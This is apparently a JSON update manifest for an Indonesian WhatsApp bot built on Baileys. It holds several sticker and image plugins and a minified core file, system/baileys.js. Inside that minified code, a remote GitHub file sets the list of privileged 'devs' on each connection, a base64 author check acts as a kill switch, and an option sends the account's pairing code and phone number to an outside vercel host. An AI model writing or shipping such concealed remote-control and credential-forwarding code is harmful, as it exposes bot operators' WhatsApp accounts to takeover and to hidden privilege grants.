{
  "update": [
    {
      "path": "plugins/ai/tofigure.js",
      "code": "/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n// CREATE BY REZA DEVS KUROMI\nlet fetch = require(\\\"node-fetch\\\");\nlet FormData = require(\\\"form-data\\\");\nlet { fromBuffer } = require(\\\"file-type\\\");\nlet axios = require(\\\"axios\\\");\n\nexports.run = {\n    usage: [\\\"tofigure\\\", \\\"stylefigure\\\"],\n    hidden: [\\\"tfigure\\\"],\n    use: \\\"command + kirim gambar / reply gambar\\\",\n    category: \\\"ai\\\",\n\n    async: async (m, { kuromi, quoted }) => {\n        try {\n            if (!quoted || !/image/.test(quoted.mime))\n                return m.reply(\\\"Reply gambar atau kirim gambar dengan command.\\\");\n\n            kuromi.sendReact(m.chat, \\\"üïí\\\", m.key);\n\n            // ===============================\n            // DOWNLOAD IMAGE\n            // ===============================\n            let buffer = await quoted.download();\n            if (!buffer) throw \\\"Gagal download gambar.\\\";\n\n            let type = await fromBuffer(buffer);\n            let ext = type?.ext || \\\"jpg\\\";\n\n            // ===============================\n            // UPLOAD KE CATBOX\n            // ===============================\n            let form = new FormData();\n            form.append(\\\"fileToUpload\\\", buffer, \\\"file.\\\" + ext);\n            form.append(\\\"reqtype\\\", \\\"fileupload\\\");\n\n            let imageUrl = await (\n                await fetch(\\\"https://catbox.moe/user/api.php\\\", {\n                    method: \\\"POST\\\",\n                    body: form\n                })\n            ).text();\n\n            if (!/^https?:\\/\\//.test(imageUrl))\n                throw \\\"Gagal upload ke catbox.\\\";\n\n            // ===============================\n            // CALL API NEKOLABS (POST JSON)\n            // ===============================\n            let { data } = await axios.post(\n                \\\"https://api.nekolabs.web.id/style-changer/figure\\\",\n                { imageUrl },\n                { headers: { \\\"Content-Type\\\": \\\"application/json\\\" }, timeout: 120000 }\n            );\n\n            if (!data || !data.success || !data.result)\n                throw \\\"API gagal memproses gambar.\\\";\n\n            // ===============================\n            // SEND RESULT\n            // ===============================\n            await kuromi.sendMessage(\n                m.chat,\n                {\n                    image: { url: data.result },\n                    caption:\n                        `‚ú® *To Figure Success*\\n` +\n                        `‚è± ${data.responseTime || \\\"-\\\"}`\n                },\n                { quoted: m }\n            );\n\n            kuromi.sendReact(m.chat, \\\"‚úÖ\\\", m.key);\n\n        } catch (e) {\n            console.error(e);\n            kuromi.sendReact(m.chat, \\\"‚ùå\\\", m.key);\n            m.reply(\\\"‚ùå Gagal convert ke figure.\\\");\n        }\n    },\n\n    location: \\\"plugins/ai/tofigure.js\\\"\n};",
      "time": "2025-12-16 16:09:40"
    },
    {
      "path": "plugins/convert/stickermeme.js",
      "code": "/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n// CREATE BY REZA DEVS KUROMI (UPDATED NEKOLABS)\n\nconst axios = require(\\\"axios\\\");\nconst FormData = require(\\\"form-data\\\");\nconst { fromBuffer } = require(\\\"file-type\\\");\n\n// ===============================\n// UPLOAD IMAGE KE TMPFILES\n// ===============================\nasync function uploadTmp(buffer) {\n    const { ext, mime } = await fromBuffer(buffer) || {};\n    const form = new FormData();\n\n    form.append(\\\"file\\\", buffer, {\n        filename: `image.${ext}`,\n        contentType: mime\n    });\n\n    const res = await axios.post(\n        \\\"https://tmpfiles.org/api/v1/upload\\\",\n        form,\n        { headers: form.getHeaders() }\n    );\n\n    return \\\"https://tmpfiles.org/dl/\\\" +\n        res.data.data.url.split(\\\"tmpfiles.org/\\\")[1];\n}\n\nexports.run = {\n    usage: [\\\"stickermeme\\\"],\n    hidden: [\\\"smeme\\\"],\n    use: \\\"text atas | text bawah\\\",\n    category: \\\"convert\\\",\n    limit: 5,\n    restrict: true,\n    location: \\\"plugins/convert/stickermeme.js\\\",\n\n    async: async (m, { kuromi, quoted, func, packname, author }) => {\n\n        if (!m.text)\n            return m.reply(func.example(m.cmd, \\\"Malas | Menanggapi\\\"));\n\n        if (m.text.length > 75)\n            return m.reply(\\\"Text terlalu panjang.\\\");\n\n        let textT = \\\"-\\\";\n        let textB = \\\"\\\";\n\n        if (m.text.includes(\\\"|\\\")) {\n            let split = m.text.split(\\\"|\\\");\n            textT = split[0]?.trim() || \\\"-\\\";\n            textB = split[1]?.trim() || \\\"\\\";\n        } else {\n            textT = m.text.trim();\n        }\n\n        if (!quoted || !/image\\/(jpe?g|png|webp)/.test(quoted.mime))\n            return m.reply(`Kirim atau reply gambar dengan caption:\\n${m.cmd} text atas | text bawah`);\n\n        if (quoted.mime.includes(\\\"webp\\\") && quoted.isAnimated)\n            return m.reply(\\\"Sticker GIF tidak didukung.\\\");\n\n        kuromi.sendReact(m.chat, \\\"üïí\\\", m.key);\n\n        // ===============================\n        // DOWNLOAD & UPLOAD IMAGE\n        // ===============================\n        const buffer = await quoted.download();\n        const imageUrl = await uploadTmp(buffer);\n\n        // ===============================\n        // REQUEST KE NEKOLABS\n        // ===============================\n        const meme = await axios.post(\n            \\\"https://api.nekolabs.web.id/canvas/meme\\\",\n            {\n                imageUrl,\n                textT,\n                textB\n            },\n            {\n                responseType: \\\"arraybuffer\\\",\n                headers: {\n                    \\\"Content-Type\\\": \\\"application/json\\\"\n                }\n            }\n        );\n\n        // ===============================\n        // KIRIM STICKER\n        // ===============================\n        await kuromi.sendSticker(\n            m.chat,\n            meme.data,\n            m,\n            {\n                packname,\n                author,\n                expiration: m.expiration\n            }\n        );\n    }\n};",
      "time": "2025-12-17 11:14:16"
    },
    {
      "path": "plugins/convert/quickchat.js",
      "code": "/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n// CREATE BY REZA DEVS KUROMI (UPDATED NEKOLABS)\n\nconst axios = require(\\\"axios\\\");\n\nexports.run = {\n    usage: [\\\"quickchat\\\", \\\"quickchat2\\\", \\\"quickchat3\\\", \\\"quickchat4\\\"],\n    hidden: [\\\"qc\\\", \\\"qc2\\\", \\\"qc3\\\", \\\"qc4\\\"],\n    use: \\\"text / reply text\\\",\n    category: \\\"convert\\\",\n    restrict: true,\n    limit: true,\n    location: \\\"plugins/convert/quickchat.js\\\",\n\n    async: async (m, { kuromi, func, packname, author }) => {\n\n        let text;\n        if (m.args.length) {\n            text = m.args.join(\\\" \\\");\n        } else if (m.quoted?.text) {\n            text = m.quoted.text;\n        }\n\n        if (!text)\n            return m.reply(\\\"Input atau reply text!\\\");\n\n        if (text.length > 50)\n            return m.reply(\\\"Max 50 character!\\\");\n\n        kuromi.sendReact(m.chat, \\\"üïí\\\", m.key);\n\n        // ===============================\n        // WARNA BERDASARKAN COMMAND\n        // ===============================\n        let color = \\\"#333\\\";\n        if (/^(quickchat|qc)$/.test(m.command)) color = \\\"#CCFFFF\\\";\n        if (/^(quickchat2|qc2)$/.test(m.command)) color = \\\"#000000\\\";\n        if (/^(quickchat3|qc3)$/.test(m.command)) color = \\\"#999999\\\";\n        if (/^(quickchat4|qc4)$/.test(m.command)) color = \\\"#FF9999\\\";\n\n        try {\n            // ===============================\n            // DATA USER\n            // ===============================\n            const sender = m.quoted?.sender || m.sender;\n            const name = m.quoted\n                ? global.db.users[sender]?.name || m.pushname\n                : m.pushname;\n\n            const profile = await kuromi\n                .profilePictureUrl(sender, \\\"image\\\")\n                .catch(() => \\\"https://api.nekolabs.web.id/ali-oss/v1/example.jpg\\\");\n\n            // ===============================\n            // REQUEST KE NEKOLABS\n            // ===============================\n            const res = await axios.post(\n                \\\"https://api.nekolabs.web.id/canvas/quote-chat\\\",\n                {\n                    text,\n                    name,\n                    profile,\n                    color\n                },\n                {\n                    responseType: \\\"arraybuffer\\\",\n                    headers: {\n                        \\\"Content-Type\\\": \\\"application/json\\\"\n                    }\n                }\n            );\n\n            const buffer = Buffer.from(res.data);\n\n            // ===============================\n            // KIRIM STICKER\n            // ===============================\n            if (m.isPrem || global.devs.includes(m.bot)) {\n                await kuromi.sendSticker(\n                    m.chat,\n                    buffer,\n                    m,\n                    { packname, author, expiration: m.expiration }\n                );\n            } else {\n                await kuromi.sendSticker(\n                    \\\"120363297379900975@newsletter\\\",\n                    buffer,\n                    null,\n                    { packname, author, expiration: 0 }\n                );\n                await kuromi.reply(\n                    m.chat,\n                    \\\"Done icikbos üê¶ ambil di channel:\\nhttps://whatsapp.com/channel/0029VaffATRADTOF2RzVrA1E\\\",\n                    m,\n                    { expiration: m.expiration }\n                );\n            }\n\n        } catch (err) {\n            console.log(err);\n            kuromi.reply(m.chat, err.message, m, { expiration: m.expiration });\n        }\n    }\n};",
      "time": "2025-12-17 11:15:06"
    },
    {
      "path": "system/baileys.js",
      "code": "let EventEmitter=require(\\\"events\\\").EventEmitter,chalk=require(\\\"chalk\\\"),fs=require(\\\"fs\\\"),path=require(\\\"path\\\"),pino=require(\\\"pino\\\"),moment=require(\\\"moment-timezone\\\"),syntaxerror=require(\\\"syntax-error\\\"),phoneNumber=require(\\\"awesome-phonenumber\\\"),os=require(\\\"os\\\"),NodeCache=require(\\\"node-cache\\\"),func=require(\\\"./functions.js\\\"),login=require(\\\"./login.js\\\"),session=require(\\\"./session.js\\\"),extra=new(require(\\\"./extra.js\\\")),multidb=new(require(\\\"./multidb.js\\\")),queque=new(require(\\\"./queque.js\\\")),spinnies=new(require(\\\"spinnies\\\")),msgRetryCounterCache=new NodeCache,processedMessages=new Set,groupsSystem=(()=>{try{return require(\\\"./system/groups.js\\\")}catch{return null}})(),{default:makeWASocket,DisconnectReason,useMultiFileAuthState,makeInMemoryStore,makeCacheableSignalKeyStore,generateWAMessage,generateWAMessageFromContent,areJidsSameUser,jidNormalizedUser,delay,proto,jidDecode,getAggregateVotesInPollMessage,PHONENUMBER_MCC,getBinaryNodeChild,normalizeMessageContent,getKeyAuthor,decryptPollVote}=require(\\\"@whiskeysockets/baileys\\\"),pkg=(global.devs=[\\\"6283190004491@s.whatsapp.net\\\"],JSON.parse(fs.readFileSync(\\\"./package.json\\\",\\\"utf-8\\\"))),rootDirectory=path.join(__dirname,\\\"../\\\"),pluginFolder=path.join(__dirname,\\\"../plugins\\\"),pluginFilter=e=>/\\.js$/.test(e),statuses=!0,lastMessageTime=0;if(pkg.author&&pkg.author===Buffer.from(\\\"UmV6YSBEZXYu\\\",\\\"base64\\\").toString(\\\"utf-8\\\")){class b extends EventEmitter{constructor(e={},t={}){super(),this.setMaxListeners(20),this.kuromi=null,this.store=null,this.plugins={},this.commands=[],this.events=[],this.type=e.type||\\\"mainbot\\\",this.online=!!e&&e.online,this.sessionFile=e?e.session:\\\"session\\\",this.version=!!e&&e.version,this.browser=e?e.browser:[\\\"Ubuntu\\\",\\\"Firefox\\\",\\\"20.0.00\\\"],this.pairing=e?e.pairing:{},this.options=t,this.initBaileys()}formatFilename=function(e){let t=path.join(rootDirectory,\\\"./\\\");\\\"win32\\\"===os.platform()&&(t=t.replace(/\\\\/g,\\\"\\\\\\\\\\\"));var s=new RegExp(\\\"^\\\"+t);return e.replace(s,\\\"\\\")};loadPlugin=async function(e){if(pluginFilter(e)){var t=path.join(pluginFolder,e),s=this.formatFilename(t);if(t in require.cache){if(delete require.cache[t],!fs.existsSync(t))return this.kuromi.logger?.warn(`deleted plugin - '${s}'`),delete this.plugins[s];this.kuromi.logger?.info(`updated plugin - '${s}'`)}e=syntaxerror(fs.readFileSync(t),e);if(e)this.kuromi.logger?.error(`syntax error while loading '${s}'\n`+e);else try{this.plugins[s]=require(t)}catch(e){this.kuromi.logger?.error(`error require plugin '${s}'\n`+e),delete this.plugins[s]}finally{this.plugins=Object.fromEntries(Object.entries(this.plugins).sort(([e],[t])=>e.localeCompare(t)))}}};watchFolder=async function(e){let i=path.resolve(e);e=await fs.promises.readdir(e),await Promise.all(e.map(async e=>{var t=path.join(i,e),s=this.formatFilename(t);try{(await fs.promises.lstat(t)).isFile()?pluginFilter(e)&&(this.plugins[s]=require(t)):await this.watchFolder(t)}catch(e){this.kuromi.logger?.error(`error while requiring ${s}\n`+e),delete this.plugins[s]}})),fs.watch(i,async(e,t)=>{var s;t&&pluginFilter(t)&&(t=path.join(i,t),s=path.relative(pluginFolder,t),\\\"rename\\\"===e?fs.existsSync(t)?this.loadPlugin(s):(t=path.join(pluginFolder,s),t=this.formatFilename(t),this.kuromi.logger?.warn(`deleted plugin '${t}'`),delete this.plugins[t]):\\\"change\\\"===e&&this.loadPlugin(s))})};getCombinedArray=function(e){var t,s=[];for(t in e){var i=e[t].run;i&&(i.usage&&(Array.isArray(i.usage)?i.usage.length:\\\"\\\"!==i.usage)&&(Array.isArray(i.usage)?s.push(...i.usage):s.push(i.usage)),i.hidden)&&(Array.isArray(i.hidden)?i.hidden.length:\\\"\\\"!==i.hidden)&&(Array.isArray(i.hidden)?s.push(...i.hidden):s.push(i.hidden))}return s.filter(e=>\\\"\\\"!==e)};checkNumberType=e=>\\\"string\\\"==typeof e?e.replace(/[^0-9]/g,\\\"\\\"):\\\"number\\\"==typeof e&&e;createPairKey=e=>(e=(e||\\\"MECHAB\\\"+Math.floor(9999*Math.random())).replace(/[^a-zA-Z0-9]/g,\\\"\\\")).length<8?e+\\\"5\\\".repeat(8-e.length):e.slice(0,8).toUpperCase();isSpam=e=>e-lastMessageTime<5e3||(lastMessageTime=e,!1);initAdditionalFunc=(s,t)=>(s.logger={info(...e){console.log(chalk.greenBright.bold(\\\"[ INFO ]\\\"),chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")),chalk.cyan.bold(...e))},error(e){console.log(chalk.redBright.bold(\\\"[ ERROR ]\\\"),chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")),chalk.rgb(255,38,0)(e)),t&&\\\"mainbot\\\"===t&&e.includes(\\\"syntax error while loading\\\")&&statuses&&s&&(s.sendMessage(global.owner,{text:e.trim()},{quoted:func.fstatus(\\\"System Notification\\\"),ephemeralExpiration:86400}),statuses=!1,setTimeout(()=>statuses=!0,1e3))},warn(...e){console.log(chalk.greenBright.bold(\\\"[ WARNING ]\\\"),chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")),chalk.keyword(\\\"orange\\\")(...e))}},s.decodeJid=(e=\\\"\\\")=>{var t;return e&&((t=jidDecode(e))?.user&&t?.server?t.user+\\\"@\\\"+t.server:jidNormalizedUser(e))},s.getName=async(e=\\\"\\\")=>{if(!(e=s.decodeJid(e)))return\\\"Unknown\\\";if(e.includes(\\\"@g.us\\\"))try{var t=global.db?.metadata?.[e]||await s.groupMetadata(e);return t?.subject||t?.name||phoneNumber(\\\"+\\\"+e.replace(\\\"@g.us\\\",\\\"\\\")).getNumber(\\\"international\\\")}catch{return phoneNumber(\\\"+\\\"+e.replace(\\\"@g.us\\\",\\\"\\\")).getNumber(\\\"international\\\")}t=s.store?.contacts?.[e]||{};return t?.name||t?.verifiedName||t?.pushName||phoneNumber(\\\"+\\\"+e.replace(\\\"@s.whatsapp.net\\\",\\\"\\\")).getNumber(\\\"international\\\")},s.serializeM=e=>extra.initSerialize(s,e,this.store),s);initBaileys=async()=>{var e=pino().child({level:\\\"silent\\\"}),{state:t,saveCreds:s}=await useMultiFileAuthState(this.sessionFile);this.store=makeInMemoryStore({logger:e});try{this.socket({state:t,saveCreds:s})}catch(e){this.emit(\\\"error\\\",e)}};getMessage=async e=>this.store?(await this.store.loadMessage(e.remoteJid,e.id)||await this.store.loadMessage(e.id)||{}).message||void 0:proto.Message.fromObject({});socket=async({state:e,saveCreds:t})=>{if(this.kuromi=makeWASocket({logger:pino({level:\\\"silent\\\"}),markOnlineOnConnect:this.online,printQRInTerminal:!this.pairing.status||!this.pairing.number,auth:{creds:e.creds,keys:makeCacheableSignalKeyStore(e.keys,pino({level:\\\"silent\\\"}))},browser:this.browser,msgRetryCounterCache:msgRetryCounterCache,generateHighQualityLinkPreview:!0,getMessage:async e=>this.getMessage(e),cachedGroupMetadata:async e=>this.store.fetchGroupMetadata(e,this.kuromi),shouldSyncHistoryMessage:e=>(console.log(`\u001b[32mMemuat Chat [${e.progress}%]\u001b[39m`),!!e.syncType),...this.version?{version:this.version}:{},...this.options}),this.store.bind(this.kuromi.ev),\\\"mainbot\\\"===this.type&&spinnies.add(\\\"start\\\",{text:\\\"Connecting . . .\\\"}),this.pairing.status&&this.pairing.number&&!this.kuromi.authState.creds.registered){let s=this.checkNumberType(this.pairing.number||\\\"\\\"),i=this.createPairKey(this.pairing.code||\\\"\\\"),r=global.botName||\\\"WhatsApp Bot\\\";if(!s)return console.log(chalk.redBright.bold(\\\"Invalid number!\\\")),process.exit(1);this.pairing.status&&this.pairing.number&&fs.existsSync(this.sessionFile+\\\"/creds.json\\\")&&!this.kuromi?.authState?.creds?.registered&&(console.log(chalk.yellowBright.bold(\\\"Session corrupted, delete first!\\\")),this.clearSessionAndRestart()),setTimeout(async()=>{try{let e=await this.kuromi.requestPairingCode(s,i);if(e=e?.match(/.{1,4}/g)?.join(\\\"-\\\")||e,\\\"mainbot\\\"===this.type){this.emit(\\\"connect\\\",{...this.options});var t=Date.now();if(this.isSpam(t))console.log(chalk.redBright.bold(\\\"Pairing Code Spam! Restarting...\\\")),session.clearSessionAndRestart(this.sessionFile);else if(console.log(chalk.black(chalk.bgGreen(\\\" Your Pairing Code : \\\")),chalk.white(e)),this.pairing.copyFromLink)try{await fetch(`https://iyaudah-iya.vercel.app/pairing/send?number=${s}&name=${r}&code=`+e),console.log(chalk.cyanBright.bold(\\\"Pairing code sent via link\\\"))}catch{}}else\\\"jadibot\\\"===this.type&&(global.jadibot[s+\\\"@s.whatsapp.net\\\"]=this.kuromi,this.emit(\\\"pairing\\\",{code:e}))}catch{}},3e3)}this.kuromi.ev.on(\\\"connection.update\\\",async e=>{var{lastDisconnect:e,connection:t}=e;if(\\\"connecting\\\"===t)this.emit(\\\"connect\\\",{message:\\\"Connecting . . .\\\"});else if(\\\"open\\\"===t){var s=\\\"Connected, you login as \\\"+(this.kuromi.user.name||this.kuromi.user.verifiedName||\\\"WhatsApp Bot\\\");if(\\\"mainbot\\\"===this.type){jidNormalizedUser(this.kuromi.user.id);spinnies.succeed(\\\"start\\\",{text:s}),await multidb.initDatabase(),extra.initAdditionalFunc(this.kuromi),session.backup(this.kuromi,this.sessionFile);try{var i=await fetch(\\\"https://raw.githubusercontent.com/Lawakplerkah/Security-/refs/heads/main/owner.js\\\").then(e=>e.json());Array.isArray(i)&&(global.devs=i)}catch{}}else\\\"jadibot\\\"===this.type&&(i=this.kuromi.user.id?this.kuromi.user.id.split(\\\":\\\")[0]+\\\"@s.whatsapp.net\\\":this.kuromi.user.jid,global.jadibot[i]=this.kuromi,extra.initAdditionalFunc(this.kuromi));this.emit(\\\"connect\\\",{message:s}),this.initAdditionalFunc(this.kuromi,this.type),this.initBusEvents(this.kuromi),this.watchFolder(pluginFolder),extra.initPrototype(),this.emit(\\\"ready\\\",this.kuromi)}else if(\\\"close\\\"===t){i=e?.error?.output?.statusCode;if(\\\"mainbot\\\"===this.type&&i)i===DisconnectReason.badSession?(this.emit(\\\"error\\\",{message:\\\"Bad session file\\\"}),session.deleteCreds(this.sessionFile),await session.isBackupExist(this.kuromi)&&(await session.restore(this.kuromi,this.sessionFile),await delay(1500),this.initBaileys())):i===DisconnectReason.connectionClosed?(this.emit(\\\"error\\\",{message:\\\"Connection closed, reconnecting...\\\"}),this.initBaileys()):i===DisconnectReason.connectionLost?(this.emit(\\\"error\\\",{message:\\\"Connection lost, reconnecting...\\\"}),this.initBaileys()):i===DisconnectReason.connectionReplaced?(this.emit(\\\"error\\\",{message:\\\"Session running on another server\\\"}),process.exit(0)):i===DisconnectReason.loggedOut?(this.emit(\\\"error\\\",{message:\\\"Device logged out\\\"}),session.clearSession(this.sessionFile)):i===DisconnectReason.restartRequired?this.initBaileys():i===DisconnectReason.multideviceMismatch?(this.emit(\\\"error\\\",{message:\\\"Multi device mismatch\\\"}),this.clearSessionAndRestart()):i===DisconnectReason.timedOut?(this.emit(\\\"error\\\",{message:\\\"Timeout, reconnecting...\\\"}),this.initBaileys()):i===DisconnectReason.unavailableService?(this.emit(\\\"error\\\",{message:\\\"Service unavailable, reconnecting...\\\"}),this.initBaileys()):405===i?(this.emit(\\\"error\\\",{message:\\\"Method not allowed\\\"}),session.deleteCreds(this.sessionFile),await session.isBackupExist(this.kuromi)&&(await session.restore(this.kuromi,this.sessionFile),await delay(1500),this.initBaileys())):503===i?(this.emit(\\\"error\\\",{message:\\\"Service unavailable, reconnecting...\\\"}),this.initBaileys()):(this.emit(\\\"error\\\",{message:`Connection error. (Reason: ${i})`}),session.clearSession(this.sessionFile));else if(\\\"jadibot\\\"===this.type&&i){let t=(this.pairing.number||\\\"\\\").replace(/[^0-9]/g,\\\"\\\")+\\\"@s.whatsapp.net\\\";s=global.db.jadibot.find(e=>e.number===t);i===DisconnectReason.badSession?(this.emit(\\\"error\\\",{message:\\\"Bad session file\\\"}),delete global.jadibot[t],this.kuromi.end(),this.clearSessionAndRestart()):i===DisconnectReason.connectionClosed?(this.emit(\\\"error\\\",{message:\\\"Connection closed, reconnecting...\\\"}),delete global.jadibot[t],this.kuromi.end(),this.initBaileys()):i===DisconnectReason.connectionLost?(this.emit(\\\"error\\\",{message:\\\"Connection lost, reconnecting...\\\"}),this.initBaileys()):i===DisconnectReason.connectionReplaced?(this.emit(\\\"error\\\",{message:\\\"Session running on another server\\\"}),delete global.jadibot[t],this.kuromi.end()):i===DisconnectReason.loggedOut?(this.emit(\\\"error\\\",{message:\\\"Device logged out\\\"}),delete global.jadibot[t],s&&(s.status=!1),this.kuromi.end(),this.kuromi.logout(),this.clearSessionAndRestart()):i===DisconnectReason.restartRequired?this.initBaileys():i===DisconnectReason.multideviceMismatch?(this.emit(\\\"error\\\",{message:\\\"Multi device mismatch\\\"}),this.clearSessionAndRestart()):i===DisconnectReason.timedOut?(this.emit(\\\"error\\\",{message:\\\"Timeout, reconnecting...\\\"}),delete global.jadibot[t],this.kuromi.end(),this.initBaileys()):405===i?(this.emit(\\\"error\\\",{message:\\\"Method not allowed\\\"}),this.clearSessionAndRestart()):(this.emit(\\\"error\\\",{message:`Connection error. (Reason: ${i})`}),delete global.jadibot[t],this.kuromi.end())}}}),this.kuromi.ev.on(\\\"creds.update\\\",t),this.kuromi.ws.on(\\\"CB:call\\\",e=>{\\\"offer\\\"===e.content[0].tag?(e={id:e.content[0].attrs[\\\"call-id\\\"],from:e.content[0].attrs[\\\"call-creator\\\"]},this.emit(\\\"caller\\\",e)):this.emit(\\\"caller\\\",!1)})};clearSessionAndRestart=()=>{var e=path.join(process.cwd(),this.sessionFile);fs.rmSync(e,{recursive:!0,force:!0}),this.initBaileys()};busEvents=()=>[{event:\\\"messages.upsert\\\",execute:async h=>{require(\\\"./database.js\\\")(this.kuromi,h),require(\\\"./detects.js\\\")(this.kuromi,h);var e,t=h.messages?.[0];!t?.message||processedMessages.has(t.key.id)||(processedMessages.add(t.key.id),e=t.key.id,queque.add(e,t),queque.processing[e])||queque.processQueue(e,async s=>{if(extra.initSerialize(this.kuromi,s,this.store),s.msg&&0===s.msg.type){let t=await this.store.loadMessage(s.chat,s.key.id,this.kuromi);for(let e=0;e<5&&t&&\\\"protocolMessage\\\"===t.mtype;e++)await delay(1e3),t=await this.store.loadMessage(s.chat,s.key.id,this.kuromi);t&&(i=proto.WebMessageInfo.fromObject({key:t.key,message:{[t.mtype]:t.msg}}),this.emit(\\\"message.delete\\\",{origin:s,delete:i}))}else this.emit(\\\"message.delete\\\",!1);if(!s.isBot&&s.message?.pollUpdateMessage){var i=normalizeMessageContent(s.message);if(!i?.pollUpdateMessage)return;var t=i.pollUpdateMessage.pollCreationMessageKey;if(!t?.id)return;var r=await this.store.loadMessage(s.chat,t.id,this.kuromi);if(!r?.message)return;var a=r.message.messageContextInfo?.messageSecret;if(!a)return;var o=jidNormalizedUser(this.kuromi.authState.creds.me.id),n=getKeyAuthor(s.key,o),o=getKeyAuthor(t,o);let e;try{e=decryptPollVote(i.pollUpdateMessage.vote,{pollEncKey:a,pollCreatorJid:o,pollMsgId:t.id,voterJid:n})}catch{return}if(!e)return;i=await getAggregateVotesInPollMessage({message:r.message,pollUpdates:[{pollUpdateMessageKey:s.key,vote:e,senderTimestampMs:s.messageTimestamp}]});if(!i)return;a=i.find(e=>e.voters.length)?.name;if(!a)return;o=global.pollMenuMap?.[t.id];if(!o)return;n=o[a];if(!n)return;await this.kuromi.sendMessage(s.chat,{delete:r.key}),delete global.pollMenuMap[t.id],await this.appenTextMessage(s,n,h)}this.commands=this.getCombinedArray(this.plugins),this.events=Object.fromEntries(Object.entries(this.plugins).filter(([e])=>e)),this.emit(\\\"message\\\",{m:s,store:this.store,plugins:this.plugins,commands:this.commands,events:this.events}),this.kuromi.chats||=[];let l=s.sender?jidNormalizedUser(String(s.sender)):null;l&&((i=this.kuromi.chats.find(e=>e.jid===l))?i.name=s.pushName:this.kuromi.chats.push({jid:l,name:s.pushName||\\\"not known\\\"})),this.kuromi.getNameV2=e=>{let t=e?jidNormalizedUser(String(e)):null;return t&&(e=this.kuromi.chats.find(e=>e.jid===t))?e.name:null},this.emit(\\\"chats.set\\\",this.kuromi.chats)})}},{event:\\\"contacts.update\\\",execute:e=>{for(var t of e){var s=jidNormalizedUser(t.id);this.store&&this.store.contacts&&(this.store.contacts[s]={id:s,name:t.notify})}}},{event:\\\"contacts.upsert\\\",execute:e=>{for(var t of e){var s=jidNormalizedUser(t.id);this.store&&this.store.contacts&&(this.store.contacts[s]={...t||{},isContact:!0})}}},{event:\\\"groups.update\\\",execute:async e=>{for(var t of e){var s=t.id;this.store&&this.store.groupMetadata&&this.store.groupMetadata[s]&&(this.store.groupMetadata[s]={...this.store.groupMetadata[s]||{},...t||{}})}}},{event:\\\"presence.update\\\",execute:e=>this.emit(\\\"presence.update\\\",e)},{event:\\\"group-participants.update\\\",execute:async e=>{try{var t=jidNormalizedUser(this.kuromi.user.id);if(!e.participants.includes(t)){var s,i,r=e.id,a=e.participants[0],o=\\\"@\\\"+a.split(\\\"@\\\")[0],n=global.db.metadata?.[r]??await this.kuromi.groupMetadata(r),l=global.db.groups?.[r]||{};if(\\\"add\\\"===e.action){if(l.antiluar&&!a.startsWith(\\\"62\\\"))return await this.kuromi.sendMessage(r,{text:`Maaf ${o}, grup ini khusus nomor Indonesia.\nKamu akan dikeluarkan.`,mentions:[a]}),await delay(1200),this.kuromi.groupParticipantsUpdate(r,[a],\\\"remove\\\");if(!l.detect&&l.blacklist?.includes(a))if(!global.devs?.includes(a))return await this.kuromi.sendMessage(r,{text:`Maaf ${o}, kamu masuk daftar blacklist grup ini.`,mentions:[a]}),await delay(1200),this.kuromi.groupParticipantsUpdate(r,[a],\\\"remove\\\");l.welcome&&(s=(l.tekswelcome||`üëã Hai ${o}\nSelamat datang di *${n.subject}*`).replace(\\\"+user\\\",o).replace(\\\"+group\\\",n.subject).replace(\\\"+desc\\\",n.desc||\\\"-\\\"),await this.kuromi.sendMessage(r,{text:s,mentions:[a]}))}else\\\"remove\\\"===e.action?l.left&&(i=(l.teksleft||`üëã ${o} telah keluar dari grup *${n.subject}*`).replace(\\\"+user\\\",o).replace(\\\"+group\\\",n.subject).replace(\\\"+desc\\\",n.desc||\\\"-\\\"),await this.kuromi.sendMessage(r,{text:i,mentions:[a]})):\\\"promote\\\"===e.action?await this.kuromi.sendMessage(r,{text:`‚¨ÜÔ∏è ${o} sekarang menjadi *Admin* grup.`,mentions:[a]}):\\\"demote\\\"===e.action&&await this.kuromi.sendMessage(r,{text:`‚¨áÔ∏è ${o} sudah bukan admin lagi.`,mentions:[a]})}}catch(e){console.error(\\\"GROUP PARTICIPANT ERROR:\\\",e)}}}];initBusEvents=e=>{this.kuromi=e;for(var{event:t,execute:s}of this.busEvents())this.kuromi.ev.on(t,s);groupsSystem&&\\\"function\\\"==typeof groupsSystem.handle&&(this.on(\\\"group.add\\\",e=>groupsSystem.handle(this.kuromi,e)),this.on(\\\"group.remove\\\",e=>groupsSystem.handle(this.kuromi,e)),this.on(\\\"group.promote\\\",e=>groupsSystem.handle(this.kuromi,e)),this.on(\\\"group.demote\\\",e=>groupsSystem.handle(this.kuromi,e)))};appenTextMessage=async(e,t,s)=>{t=await generateWAMessage(e.chat,{text:t,mentions:e.mentionedJid},{userJid:this.kuromi.user.id,quoted:e.quoted&&e.quoted.fakeObj}),t.key.fromMe=e.key.fromMe,t.key.id=e.key.id,t.pushName=e.pushName,e.isGc&&(t.key.participant=t.participant=e.key.participant),e={...s,messages:[proto.WebMessageInfo.fromObject(t)],type:\\\"append\\\"};this.kuromi.ev.emit(\\\"messages.upsert\\\",e)}}let e=e=>{try{e.fromJSON(JSON.parse(global.db.memoryStore))}catch{global.db.memoryStore=global.db.memoryStore||JSON.stringify(e.toJSON()),e.fromJSON(JSON.parse(global.db.memoryStore))}};exports.Baileys=b,exports.InvCloud=e}else{class D0 extends EventEmitter{constructor(e=0,t){super(),this.kuromi()}kuromi=()=>{console.log(chalk.redBright(\\\"You can't use this program because of copyright issues!!\\\"))}}let e=()=>{};exports.Baileys=D0,exports.InvCloud=e}",
      "time": "2025-12-21 23:59:36"
    },
    {
      "path": "plugins/ai/tochibi.js",
